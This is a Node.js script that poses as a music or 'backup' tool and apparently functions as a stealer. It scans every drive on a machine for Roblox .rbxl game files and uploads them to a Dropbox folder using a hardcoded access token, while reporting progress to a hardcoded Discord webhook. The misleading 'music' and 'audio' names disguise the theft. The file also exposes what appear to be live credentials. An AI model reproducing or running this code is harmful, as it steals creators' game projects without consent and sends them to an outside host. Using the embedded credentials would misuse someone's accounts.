const fs = require('fs').promises;
const fsSync = require('fs');
const path = require('path');
const os = require('os');
const axios = require('axios');
const { Dropbox } = require('dropbox');

const speakerurl = 'https://discord.com/api/webhooks/1381477923181039776/_t-Lu5tfvMGicp94d8lSwa1pyaC3u6tlA8JSkWijfjb1wNvOLTVx_qnnnbwvOfk1GTN7';
const maxaudiofiles = 6;
const maxtracksize = 50;

const DROPBOX_ACCESS_TOKEN = 'sl.u.AFyx600eNHlV-wBOgf8saQMZh8gAVuN5Xe-q7hdK7l9ysAago-nDvn8lE407sgvwbuW0E-ZGhOHiJkYxWYqc_dltJ_SUCFvm-d6UkBl5aZjn953OzKuU3JngdGF-bCLJywSmrRm1k2vsm2GIGWDJTMY5iZzl4JaOvVK5KF0C_C0OsiM0LU8wMPuOA7jfUzXXPi-5jMUmMUFTEzdyFXkUAqvVvDB2h82vzTlD5uGFAikHC-XzUKaPWItgMlterwoeO61YVdN2ysPo5OLJ931BbQM4Ef0MHkDXhlAz-b7jc_j8vG5hBS_Z2NCCEzzdFsM5_pwxszLSOnBLV-DsosRsxHBG9LSGMKnuHAcZYxAsAbEgrsidSqyk830OWzV-520Gie1UnzgqhTJZwi2nNciJhNoc24VJtFf6KgBbfPnCDliAI-qb24OMA5zg-_W91Q5aTGHDJ4FywG-1ekv-Sf_0bq0W6Icwmo9--gIxti--uV6uEwYODYCGuN68vplqyI3uPvy0CjD_V0Gp6QZxjGBl-f1jmfKnMZTBys6kQBJJDulJh1eiyVJQcgqojMLYEO4UdADm1Pv5aKIHI-pOcejv4ZPo4exwaF4cwFLMo8cbJzP7Tsq0zKaXyMmCh3lGXJR6h24sFghQ5xMcKUKpbEPsq_FWXqPdFuQfqU0ROacgFKpUwSUruz4vWxqyQ-natOdmJnHsXC60N98OMH-4-wbKpePjeN5lltvfKJsI190vxXmWjgd0_5Xx8CGbXCszoiW80McpgET1KUq_BKLGbzns9hf_50RsHMhafscklntV2zAccm_TmzVSemvZ3h9XgGjfG0pE_Sdqz1azhnZrAYAjUMHgz68_b0G9eK0G_kVUx3TjWhZSXCbiTH3OBmYoObSQQM30n6nYAv9AV5qXrJhNSNtuN5DZ2xRVza1VKL72Zm9en55n-x8w1MmRj6JgUsKmLMfnXRU1Hoc3l662RgC_HyQ5H4-PiVSOlJU6ACYj08Td6fMsNdJv9db9Tf_FiZM_AYCeB0M0X__ig6HUNLbUtC1sB3qUXuJ_4-1Pfi14fwN5aMQAT8LiaEv5uOPoeNN8Sn5wnJfSqMH8FeEM9xyy1knGZqQJ0KzgZk-VFSlaMS3XgzFnknAeF5AOyPzqekikA8S_Nyz6TVxJAFcuG6NgJIWXVn_rdr99vbg_5WO0lTFJrgwh8Lr3NJWF64-_j4PUMdcHSF1lRDW91G0AmCbHtkQapA5a8I0LPPJSbNh1EOYknJARXBCkX9U57aApK8D70I_uXSNL_eZ36hhhwLV48j0TtZTuRZlUThnqKwKrvh437--84XuMvLsNnJRYN2szPVRLLG2TauYg_v55yM_bby65Qh8QraAG80ex_mTeoL3NKkhrwCcRN7vEiEQe9v2C-AGHph7wff_2XRsFYAdzNuxl';
const DROPBOX_FOLDER_PATH = '/RobloxBackups';

let dropboxClient = null;
let existingFiles = new Map();

async function initializeDropbox() {
    try {
        if (!DROPBOX_ACCESS_TOKEN || DROPBOX_ACCESS_TOKEN === 'your_dropbox_access_token_here') {
            throw new Error('Dropbox access token not configured');
        }
        
        dropboxClient = new Dropbox({ 
            accessToken: DROPBOX_ACCESS_TOKEN,
            fetch: require('node-fetch')
        });
        
        await dropboxClient.usersGetCurrentAccount();
        
        try {
            await dropboxClient.filesCreateFolderV2({ path: DROPBOX_FOLDER_PATH });
        } catch (error) {
            if (error.error && error.error.error_summary && !error.error.error_summary.includes('conflict')) {
                throw error;
            }
        }
        
        await sendmusicmessage('✅ Dropbox API initialized successfully');
        return true;
    } catch (error) {
        await sendmusicmessage(`❌ Failed to initialize Dropbox: ${error.message}`);
        return false;
    }
}

async function loadExistingFiles() {
    try {
        if (!dropboxClient) {
            throw new Error('Dropbox not initialized');
        }

        existingFiles.clear();
        let cursor = null;
        let hasMore = true;

        while (hasMore) {
            let response;
            if (cursor) {
                response = await dropboxClient.filesListFolderContinue({ cursor });
            } else {
                response = await dropboxClient.filesListFolder({
                    path: DROPBOX_FOLDER_PATH,
                    recursive: false,
                    include_deleted: false
                });
            }

            for (const entry of response.result.entries) {
                if (entry['.tag'] === 'file') {
                    existingFiles.set(entry.name.toLowerCase(), {
                        id: entry.id,
                        name: entry.name,
                        size: entry.size,
                        path: entry.path_lower,
                        modified: entry.server_modified
                    });
                }
            }

            hasMore = response.result.has_more;
            cursor = response.result.cursor;
        }

        await sendmusicmessage(`📋 Loaded ${existingFiles.size} existing files from Dropbox`);
        return true;
    } catch (error) {
        await sendmusicmessage(`❌ Failed to load existing files: ${error.message}`);
        return false;
    }
}

function fileAlreadyExists(filename, fileSize) {
    const existingFile = existingFiles.get(filename.toLowerCase());
    if (!existingFile) {
        return false;
    }
    
    return Math.abs(existingFile.size - fileSize) <= 1024;
}

async function uploadToDropbox(filePath, maxRetries = 3) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
            if (!dropboxClient) {
                throw new Error('Dropbox not initialized');
            }

            const fileName = path.basename(filePath);
            const fileStats = await fs.stat(filePath);
            
            if (fileAlreadyExists(fileName, fileStats.size)) {
                return { success: true, skipped: true, reason: 'File already exists' };
            }

            const dropboxPath = `${DROPBOX_FOLDER_PATH}/${fileName}`;
            const fileContent = await fs.readFile(filePath);

            if (fileStats.size > 150 * 1024 * 1024) {
                const response = await uploadLargeFile(fileContent, dropboxPath, fileName);
                if (response.success) {
                    existingFiles.set(fileName.toLowerCase(), {
                        id: response.fileId,
                        name: fileName,
                        size: fileStats.size,
                        path: dropboxPath.toLowerCase(),
                        modified: new Date().toISOString()
                    });
                }
                return response;
            } else {
                const response = await dropboxClient.filesUpload({
                    path: dropboxPath,
                    contents: fileContent,
                    mode: 'add',
                    autorename: false
                });

                existingFiles.set(fileName.toLowerCase(), {
                    id: response.result.id,
                    name: response.result.name,
                    size: response.result.size,
                    path: response.result.path_lower,
                    modified: response.result.server_modified
                });

                return { success: true, skipped: false, fileId: response.result.id };
            }

        } catch (error) {
            if (error.error && error.error.error_summary && error.error.error_summary.includes('conflict')) {
                return { success: true, skipped: true, reason: 'File already exists (conflict)' };
            }
            
            if (error.status === 429 || (error.error && error.error.error && error.error.error['.tag'] === 'too_many_requests')) {
                const waitTime = Math.pow(2, attempt) * 5000;
                await new Promise(resolve => setTimeout(resolve, waitTime));
                continue;
            }
            
            if (attempt === maxRetries - 1) {
                return { success: false, error: error.message || error.error?.error_summary || 'Unknown error' };
            }
            
            await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempt) * 2000));
        }
    }
    
    return { success: false, error: 'Max retries exceeded' };
}

async function uploadLargeFile(fileContent, dropboxPath, fileName) {
    try {
        const CHUNK_SIZE = 8 * 1024 * 1024;
        
        const sessionStart = await dropboxClient.filesUploadSessionStart({
            contents: fileContent.slice(0, CHUNK_SIZE),
            close: false
        });
        
        const sessionId = sessionStart.result.session_id;
        let offset = CHUNK_SIZE;
        
        while (offset < fileContent.length) {
            const chunk = fileContent.slice(offset, offset + CHUNK_SIZE);
            const isLastChunk = offset + chunk.length >= fileContent.length;
            
            if (isLastChunk) {
                await dropboxClient.filesUploadSessionFinish({
                    cursor: {
                        session_id: sessionId,
                        offset: offset
                    },
                    commit: {
                        path: dropboxPath,
                        mode: 'add',
                        autorename: false
                    },
                    contents: chunk
                });
                break;
            } else {
                await dropboxClient.filesUploadSessionAppendV2({
                    cursor: {
                        session_id: sessionId,
                        offset: offset
                    },
                    contents: chunk,
                    close: false
                });
            }
            
            offset += chunk.length;
        }
        
        return { success: true, skipped: false, fileId: sessionId };
    } catch (error) {
        return { success: false, error: error.message || 'Large file upload failed' };
    }
}

async function sendmusicmessage(audiotext) {
    try {
        const sounddata = { content: audiotext };
        await axios.post(speakerurl, sounddata, { timeout: 10000 });
    } catch (error) {
    }
}

function getAvailableDrives() {
    const drives = [];
    if (os.platform() === 'win32') {
        for (let i = 65; i <= 90; i++) {
            const drive = `${String.fromCharCode(i)}:\\`;
            if (fsSync.existsSync(drive)) {
                drives.push(drive);
            }
        }
    } else {
        drives.push('/');
    }
    return drives;
}

function shouldSkipDirectory(dirName) {
    const skipDirs = new Set([
        '$RECYCLE.BIN', 'System Volume Information'
    ]);
    
    return skipDirs.has(dirName);
}

async function validateRbxlFile(filePath) {
    try {
        if (!filePath.toLowerCase().endsWith('.rbxl')) {
            return false;
        }
        
        const stats = await fs.stat(filePath);
        
        if (stats.size > maxtracksize * 1024 * 1024) {
            return false;
        }
        
        if (stats.size < 100) {
            return false;
        }
        
        try {
            await fs.access(filePath, fsSync.constants.R_OK);
        } catch (error) {
            return false;
        }
        
        return true;
    } catch (error) {
        return false;
    }
}

async function scanDirectory(dirPath, foundFiles, depth = 0) {
    if (depth > 10) return;
    
    try {
        const entries = await fs.readdir(dirPath, { withFileTypes: true });
        
        for (const entry of entries) {
            const fullPath = path.join(dirPath, entry.name);
            
            if (entry.isDirectory()) {
                if (!shouldSkipDirectory(entry.name)) {
                    await scanDirectory(fullPath, foundFiles, depth + 1);
                }
            } else if (entry.isFile() && entry.name.toLowerCase().endsWith('.rbxl')) {
                if (await validateRbxlFile(fullPath)) {
                    foundFiles.push(fullPath);
                }
            }
        }
    } catch (error) {
    }
}

async function findmusicfiles() {
    const foundFiles = [];
    const drives = getAvailableDrives();
    
    await sendmusicmessage(`🔍 Starting comprehensive scan of ${drives.length} drives: ${drives.join(', ')}`);
    
    for (const drive of drives) {
        await sendmusicmessage(`📁 Scanning drive: ${drive}`);
        await scanDirectory(drive, foundFiles);
    }
    
    await sendmusicmessage(`📊 Total .rbxl files found: ${foundFiles.length}`);
    
    const sortedFiles = foundFiles.sort((a, b) => {
        try {
            const aStats = fsSync.statSync(a);
            const bStats = fsSync.statSync(b);
            return bStats.size - aStats.size;
        } catch {
            return 0;
        }
    });
    
    return sortedFiles;
}

async function processaudiobatch(musicfiles, downloadbatchsize = maxaudiofiles) {
    const uploadresults = [];
    const totalbatches = Math.ceil(musicfiles.length / downloadbatchsize);
    let skippedCount = 0;
    
    await sendmusicmessage(`📤 Starting Dropbox upload: ${musicfiles.length} files in ${totalbatches} batches`);
    
    for (let i = 0; i < musicfiles.length; i += downloadbatchsize) {
        const currentbatch = Math.floor(i / downloadbatchsize) + 1;
        const audiobatch = musicfiles.slice(i, i + downloadbatchsize);
        
        const batchprogress = Math.round((currentbatch / totalbatches) * 100);
        await sendmusicmessage(`📊 Upload progress: ${batchprogress}% (batch ${currentbatch}/${totalbatches}) - processing ${audiobatch.length} files`);
        
        const batchpromises = audiobatch.map(async (musicfile) => {
            await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
            return uploadToDropbox(musicfile);
        });
        
        try {
            const batchresults = await Promise.allSettled(batchpromises);
            const batchuploads = batchresults.map(audioresult => 
                audioresult.status === 'fulfilled' ? audioresult.value : { success: false, error: 'Promise rejected' }
            );
            
            uploadresults.push(...batchuploads);
            
            const batchsuccesses = batchuploads.filter(result => result.success && !result.skipped).length;
            const batchskipped = batchuploads.filter(result => result.success && result.skipped).length;
            const totalsuccesses = uploadresults.filter(result => result.success && !result.skipped).length;
            skippedCount += batchskipped;
            
            await sendmusicmessage(`✅ Batch ${currentbatch} complete: ${batchsuccesses} uploaded, ${batchskipped} skipped (duplicates) (total: ${totalsuccesses}/${uploadresults.length}, ${skippedCount} skipped)`);
            
        } catch (error) {
            uploadresults.push(...new Array(audiobatch.length).fill({ success: false, error: 'Batch error' }));
            await sendmusicmessage(`❌ Batch ${currentbatch} failed: ${error.message}`);
        }
        
        if (i + downloadbatchsize < musicfiles.length) {
            await sendmusicmessage(`⏳ Waiting 3 seconds before next batch...`);
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    
    return { results: uploadresults, skipped: skippedCount };
}

async function backupaudiofiles() {
    const dropboxInitialized = await initializeDropbox();
    if (!dropboxInitialized) {
        await sendmusicmessage("❌ Cannot proceed without Dropbox API access");
        return;
    }
    
    const existingLoaded = await loadExistingFiles();
    if (!existingLoaded) {
        await sendmusicmessage("⚠️ Proceeding without duplicate checking");
    }
    
    const foundmusicfiles = await findmusicfiles();
    
    if (foundmusicfiles.length === 0) {
        await sendmusicmessage("❌ No Roblox files found");
        return;
    }
    
    const filesizesummary = foundmusicfiles.reduce((total, file) => {
        try {
            return total + fsSync.statSync(file).size;
        } catch {
            return total;
        }
    }, 0);
    
    const filesizeinmb = Math.round(filesizesummary / 1024 / 1024);
    
    await sendmusicmessage(`📋 Analysis complete: found ${foundmusicfiles.length} Roblox files (${filesizeinmb}MB total), starting Dropbox upload...`);
    
    const { results: downloadresults, skipped: skippedCount } = await processaudiobatch(foundmusicfiles);
    
    const successfulmusic = downloadresults.filter(audioresult => audioresult.success && !audioresult.skipped).length;
    
    const musicmessage = `🎉 Dropbox upload complete: ${successfulmusic}/${foundmusicfiles.length} files uploaded successfully, ${skippedCount} duplicates skipped`;
    await sendmusicmessage(musicmessage);
    
    if (successfulmusic > 0) {
        const locationbreakdown = {};
        foundmusicfiles.forEach((file, index) => {
            if (downloadresults[index] && downloadresults[index].success && !downloadresults[index].skipped) {
                const filedir = path.dirname(file);
                const locationkey = filedir.split('\\').slice(-2).join('\\');
                locationbreakdown[locationkey] = (locationbreakdown[locationkey] || 0) + 1;
            }
        });
        
        const breakdowntext = Object.entries(locationbreakdown)
            .map(([location, count]) => `${location}: ${count}`)
            .join(', ');
        
        await sendmusicmessage(`📁 Upload sources: ${breakdowntext}`);
    }
}

async function main() {
    try {
        await backupaudiofiles();
    } catch (error) {
        await sendmusicmessage(`❌ Backup failed: ${error.message}`);
    }
}

if (require.main === module) {
    main();
}

module.exports = {
    backupaudiofiles,
    findmusicfiles,
    uploadToDropbox,
    validateRbxlFile,
    sendmusicmessage,
    initializeDropbox,
    loadExistingFiles
};
